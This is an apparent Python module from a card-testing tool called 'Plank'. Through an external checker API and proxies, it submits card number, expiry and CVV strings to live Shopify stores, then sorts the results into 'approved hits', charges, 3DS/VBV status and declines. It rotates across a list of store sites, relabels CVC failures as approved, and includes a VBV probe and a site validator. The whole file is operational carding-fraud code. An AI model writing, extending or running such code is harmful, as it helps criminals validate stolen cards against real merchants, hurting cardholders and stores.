"""
Plank — Gate checker wrappers.
Calls the external Shopify checker API.
"""

import asyncio
import os
import aiohttp
import time

from config import CHECKER_API_URL, MAX_PRICE

# Project-root error log (portable; was previously a hardcoded absolute path)
_ERROR_LOG = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "error.log"
)


# ── Response classification ──────────────────────────
# Maps a raw checker response to a short label used for "valid site" exports.
# A site is considered valid (live + processing) for any of these categories.
_APPROVED = ("CHARGED", "APPROVED", "THANK_YOU", "THANKYOU", "ORDER_CONFIRMED",
             "PAYMENT_SUCCESS", "SUCCESS", "PAID")
_ORDER_PLACED = ("ORDER_PLACED", "ORDER_RECEIVED")
_THREE_DS = ("3DS_REQUIRED", "3DS", "3D_SECURE", "AUTHENTICATION_REQUIRED",
             "AUTH_REQUIRED", "VBV")
_DECLINED = ("CARD_DECLINED", "DECLINED", "DO_NOT_HONOR", "INSUFFICIENT_FUNDS",
             "GENERIC_DECLINE", "PICKUP_CARD", "TRANSACTION_NOT_ALLOWED")


def classify_response(resp: str) -> tuple[bool, str]:
    """Return (is_valid_site, short_label) for a checker response string.

    Labels: 'approved', 'order_placed', '3d', 'declined', or '' when invalid.
    """
    r = (resp or "").upper()
    if any(k in r for k in _APPROVED):
        return True, "approved"
    if any(k in r for k in _ORDER_PLACED):
        return True, "order_placed"
    if any(k in r for k in _THREE_DS):
        return True, "3d"
    if any(k in r for k in _DECLINED):
        return True, "declined"
    return False, ""


def map_api_response(raw_resp: str) -> str:
    """Map raw responses from the new api.py to standard checker codes."""
    if not raw_resp:
        return "CARD_DECLINED"
    
    r = raw_resp.upper().strip()
    
    # 0. Checkpoint / Captcha masking (mapped to CARD_DECLINED)
    if "CHECKPOINT" in r or "CAPTCHA" in r or "ROBOT" in r:
        return "CARD_DECLINED"
    
    # 1. Success / Charged
    if "CHARGE_SUCCESS" in r or "THANK_YOU" in r or "ORDER_PLACED" in r or "PROCESSEDRECEIPT" in r or "ORDERCREATIONSUCCEEDED" in r:
        return "CHARGED"
    
    # 2. 3D Secure / Authentication
    if "3DS" in r or "ACTION_REQUIRED" in r or "OTP" in r or "AUTHENTICATION" in r or "CHALLENGE" in r:
        return "3DS_REQUIRED"
        
    # 3. CVC Declines (which are approved hits)
    if "CVC" in r or "SECURITY_CODE" in r or "INCORRECT_CVC" in r:
        return "INVALID_CVC"
        
    # 4. Insufficient Funds (which are approved hits)
    if "INSUFFICIENT" in r:
        return "INSUFFICIENT_FUNDS"
        
    # 5. Expired Card
    if "EXPIRED" in r:
        return "EXPIRED_CARD"
        
    # 6. Specific Site/API Errors
    if "NO_PRODUCT" in r or "NO PRODUCT" in r:
        return "NO_PRODUCT"
    if "PRICE_OVER_MAX" in r or "PRODUCT_OVER_MAIN" in r or "PRODUCT_OVER_MAX" in r:
        return "PRICE_OVER_MAX"
    if "NO_SESSION_TOKEN" in r:
        return "NO_SESSION_TOKEN"
        
    # 7. Declines / Generic errors
    if any(err in r for err in (
        "GENERIC_ERROR", "PAYMENT_FAILED", "PROCESSING_ERROR", 
        "SUBMIT_FAILED", "SUBMIT_REJECTED", "FAILED_RECEIPT"
    )):
        return "CARD_DECLINED"
        
    # 8. Other errors / API failures
    if any(err in r for err in (
        "TIMEOUT", "REJECT", "THROTTLED", "INVALID_RESPONSE", "CART_FAILED", 
        "SITE_REQUIRES_LOGIN", "GRAPHQL_ERROR", 
        "NEGOTIATIONRESULTFAILED", "NO_PAYMENT_METHOD", "TOKENIZATION_FAILED", 
        "SUBMIT_FAILED", "POLL_EMPTY_RECEIPT", "SUBMIT_REJECTED", 
        "UNKNOWN_SUBMIT_TYPE", "MAX_RETRIES_EXCEEDED", "FAIL"
    )):
        return "API_ERROR"
    if r.startswith("ERROR:"):
        return "API_ERROR"
        
    return r



# (Concurrency Limiter removed as it was causing global bottlenecking)

# ── Priority Queue/Yielding for Diamond & Bedrock ─────
_active_priority_checks = 0

def register_priority_check_start():
    global _active_priority_checks
    _active_priority_checks += 1

def register_priority_check_end():
    global _active_priority_checks
    if _active_priority_checks > 0:
        _active_priority_checks -= 1

async def wait_if_low_priority():
    # Disabled to prevent starvation of low priority users
    pass


# ── Shared session for API calls ─────────────────────

_api_session: aiohttp.ClientSession | None = None
_api_timeout = aiohttp.ClientTimeout(total=30)


async def _get_api_session() -> aiohttp.ClientSession:
    global _api_session
    if _api_session is None or _api_session.closed:
        _api_session = aiohttp.ClientSession(
            timeout=_api_timeout,
            connector=aiohttp.TCPConnector(
                limit=300,
            )
        )
    return _api_session


def _error_result(cc, month, year, cvv, response, gate="Shopify", price="0.00",
                  charged="False", approved="False", elapsed=0.0):
    return {
        "Response": response,
        "CC": f"{cc}|{month}|{year}|{cvv}",
        "Price": price,
        "Gate": gate,
        "Site": "",
        "Charged": charged,
        "Approved": approved,
        "Time": f"{elapsed}s",
    }


# ── Shopify checker (via external API) ───────────────

async def check_shopify(cc: str, month: str, year: str, cvv: str,
                        site: str = "", proxy: str = None, is_priority: bool = False) -> dict:
    """Call the external Shopify checker API.
    API format: GET {CHECKER_API_URL}/shopify?site={site}&cc={cc}|{mm}|{yy}|{cvv}&proxy={proxy}
    """
    if is_priority:
        register_priority_check_start()
    else:
        await wait_if_low_priority()

    try:
        card_str = f"{cc}|{month}|{year}|{cvv}"
        
        import random
        
        async def _do_request(current_site: str) -> dict:
            start_time = time.time()
            params = {"cc": card_str, "max_price": str(MAX_PRICE)}
            if current_site:
                url_site = current_site if current_site.startswith("http") else f"https://{current_site}"
                params["site"] = url_site
            if proxy:
                params["proxy"] = proxy

            try:
                session = await _get_api_session()
                async with session.get(
                    f"{CHECKER_API_URL}/shopify",
                    params=params,
                ) as resp:
                    elapsed = round(time.time() - start_time, 1)
                    if resp.status == 200:
                        data = await resp.json()
                        raw_response = data.get("card_response", data.get("Response", "CARD_DECLINED"))
                        mapped_response = map_api_response(raw_response)
                        
                        is_charged = str(data.get("charged", data.get("Charged", "False"))).lower() == "true"
                        is_approved = str(data.get("approved", data.get("Approved", "False"))).lower() == "true"
                        
                        if mapped_response == "CHARGED":
                            is_charged = True
                            is_approved = True
                        elif mapped_response in ("3DS_REQUIRED", "INVALID_CVC", "INSUFFICIENT_FUNDS"):
                            is_approved = True

                        return {
                            "Response": mapped_response,
                            "CC": card_str,
                            "Price": data.get("price", data.get("Price", "0.00")),
                            "Gate": data.get("gate", data.get("Gate", "Shopify Payments")),
                            "Site": data.get("site", data.get("Site", current_site)),
                            "Charged": "True" if is_charged else "False",
                            "Approved": "True" if is_approved else "False",
                            "Time": data.get("time", f"{elapsed}s"),
                        }
                    else:
                        resp_text = await resp.text()
                        with open(_ERROR_LOG, "a") as f:
                            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Bad HTTP status: {resp.status} response: {resp_text[:500]}\n")
                    return _error_result(cc, month, year, cvv, "API_ERROR", elapsed=elapsed)
            except asyncio.TimeoutError:
                elapsed = round(time.time() - start_time, 1)
                return _error_result(cc, month, year, cvv, "TIMEOUT", elapsed=elapsed)
            except Exception as e:
                import traceback
                with open(_ERROR_LOG, "a") as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Request Exception: {str(e)}\n{traceback.format_exc()}\n")
                elapsed = round(time.time() - start_time, 1)
                return _error_result(cc, month, year, cvv, "API_ERROR", elapsed=elapsed)

        current_site = site
        result = await _do_request(current_site)
        
        def _is_site_error(resp: str) -> bool:
            """Check if the response is a site-level error that can be resolved by rotating sites."""
            r = resp.upper()
            SITE_ERRORS = (
                "PRODUCT_OVER_MAIN", "PRICE_OVER_MAX", "NO_PRODUCT", "NO PRODUCT", "PRODUCT_OVER_MAX",
                "SITE_REQUIRES_LOGIN", "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
                "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
                "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE", "NO_PAYMENT_METHOD",
                "NO_SESSION_TOKEN", "DELIVERY_ADDRESS2_REQUIRED", "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
                "TAX_NEW_TAX_MUST_BE_ACCEPTED", "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
                "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "REQUEST_ERROR",
                "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
                "ARTIFACT_DISSATISFACTION"
            )
            return any(w in r for w in SITE_ERRORS)
        
        response = result.get("Response", "CARD_DECLINED")
        if _is_site_error(response):
            sites = await get_shopify_sites()
            visited_sites = {current_site}
            
            # Up to 2 retries across unique different sites to find a cheap enough product
            for _ in range(2):
                other_sites = [s for s in sites if s not in visited_sites]
                if not other_sites:
                    break
                current_site = random.choice(other_sites)
                visited_sites.add(current_site)
                
                result = await _do_request(current_site)
                response = result.get("Response", "CARD_DECLINED")
                if not _is_site_error(response):
                    break
            
            if _is_site_error(response):
                result["Response"] = "NO_PRODUCT"
        
        # Mask INVALID_CVC as 3DS_REQUIRED and mark as approved
        final_response = result.get("Response", "CARD_DECLINED")
        if "INVALID_CVC" in final_response.upper():
            result["Response"] = "3DS_REQUIRED"
            result["Approved"] = "True"
            
        return result
    finally:
        if is_priority:
            register_priority_check_end()


# ── Site checker (via external API) ──────────────────

async def check_site(site: str, proxy: str = None) -> dict:
    """Check a site via the external API.

    Endpoint: GET {CHECKER_API_URL}/shopify?site={site}&cc={cc}&proxy={proxy}
    A site is "valid" if it processes the card to any real gateway response
    (approved / order_placed / 3d / declined) within the price limit.
    """
    import random
    test_card = "4111111111111111|12|2030|123"
    if os.path.exists("site_cards.txt"):
        try:
            with open("site_cards.txt", "r") as f:
                cards = [l.strip() for l in f if l.strip()]
            if cards:
                test_card = random.choice(cards)
        except Exception:
            pass

    url_site = site if site.startswith("http") else f"https://{site}"
    params = {"site": url_site, "cc": test_card, "max_price": str(MAX_PRICE)}
    if proxy:
        params["proxy"] = proxy
    try:
        session = await _get_api_session()
        async with session.get(
            f"{CHECKER_API_URL}/shopify",
            params=params,
            timeout=aiohttp.ClientTimeout(total=30),
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                raw_resp = data.get("Response", data.get("card_response", "UNKNOWN"))
                resp_str = map_api_response(raw_resp).upper()
                price_str = data.get("Price", data.get("price", "0.00"))
                try:
                    price_val = float(str(price_str).replace('$', '').replace(',', ''))
                except ValueError:
                    price_val = 0.0

                is_valid, label = classify_response(resp_str)
                # Approved-class hits aren't price-gated; the rest must be cheap enough.
                if is_valid and label not in ("approved", "order_placed"):
                    is_valid = price_val <= MAX_PRICE

                SITE_ERRORS = (
                    "ERROR", "TIMEOUT", "PRICE_OVER_MAX", "NO_PRODUCT", "NO_SESSION_TOKEN",
                    "SITE_REQUIRES_LOGIN", "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
                    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
                    "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE", "NO_PAYMENT_METHOD",
                    "DELIVERY_ADDRESS2_REQUIRED", "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
                    "TAX_NEW_TAX_MUST_BE_ACCEPTED", "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
                    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "REQUEST_ERROR",
                    "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
                    "ARTIFACT_DISSATISFACTION"
                )
                if any(err_word in resp_str for err_word in SITE_ERRORS):
                    return {
                        "valid": False,
                        "site": site,
                        "error": resp_str,
                        "card_response": resp_str,
                        "response": label,
                        "price": price_str,
                        "time": data.get("Time", data.get("time", "0s")),
                        "gate": data.get("Gate", data.get("gate", "UNKNOWN"))
                    }

                return {
                    "valid": is_valid,
                    "site": site,
                    "card_response": resp_str,
                    "response": label,
                    "price": price_str,
                    "time": data.get("Time", data.get("time", "0s")),
                    "gate": data.get("Gate", data.get("gate", "UNKNOWN"))
                }
            return {"valid": False, "site": site, "error": f"HTTP_{resp.status}"}
    except asyncio.TimeoutError:
        return {"valid": False, "site": site, "error": "TIMEOUT"}
    except Exception as e:
        return {"valid": False, "site": site, "error": str(e)[:50]}


# ── VBV checker ──────────────────────────────────────

_sites_cache = None
_sites_lock = asyncio.Lock()


def _load_shopify_sites_sync() -> list[str]:
    import os
    from config import SHOPIFY_SITES_FILE
    if not os.path.exists(SHOPIFY_SITES_FILE):
        return ["kyliebaby.com"]
    try:
        with open(SHOPIFY_SITES_FILE) as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return ["kyliebaby.com"]


async def get_shopify_sites() -> list[str]:
    global _sites_cache
    if _sites_cache is not None:
        return _sites_cache
    async with _sites_lock:
        if _sites_cache is None:
            _sites_cache = await asyncio.to_thread(_load_shopify_sites_sync)
    return _sites_cache


def invalidate_sites_cache():
    global _sites_cache
    _sites_cache = None


async def remove_shopify_site(site_to_remove: str):
    global _sites_cache
    if not site_to_remove:
        return
    async with _sites_lock:
        sites = await get_shopify_sites()
        
        def clean(s):
            s = s.lower().strip()
            if s.startswith("https://"): s = s[8:]
            if s.startswith("http://"): s = s[7:]
            if s.endswith("/"): s = s[:-1]
            return s
            
        target = clean(site_to_remove)
        new_sites = [s for s in sites if clean(s) != target]
        
        if len(new_sites) < len(sites):
            _sites_cache = new_sites
            # Update the file on disk as well
            try:
                import os
                from config import SHOPIFY_SITES_FILE
                def _write_file():
                    with open(SHOPIFY_SITES_FILE, "w") as f:
                        f.write("\n".join(new_sites) + "\n" if new_sites else "")
                await asyncio.to_thread(_write_file)
            except Exception:
                pass


async def check_vbv(cc: str, month: str, year: str, cvv: str,
                    proxy: str = None, is_priority: bool = False) -> dict:
    """Check if a card requires 3DS / VBV authentication.
    Uses the Shopify gate as a lightweight probe.
    """
    import random
    sites = await get_shopify_sites()
    site = random.choice(sites) if sites else "kyliebaby.com"
    for attempt in range(2):
        result = await check_shopify(cc, month, year, cvv, site=site, proxy=proxy, is_priority=is_priority)
        response = result.get("Response", "")
        if "API_ERROR" not in response.upper() or attempt == 1:
            break
        site = random.choice(sites) if sites else site
    is_vbv = response in ("3DS_REQUIRED", "AUTHENTICATION_REQUIRED")
    return {
        "CC": f"{cc}|{month}|{year}|{cvv}",
        "VBV": "Yes" if is_vbv else "No",
        "Response": response,
    }
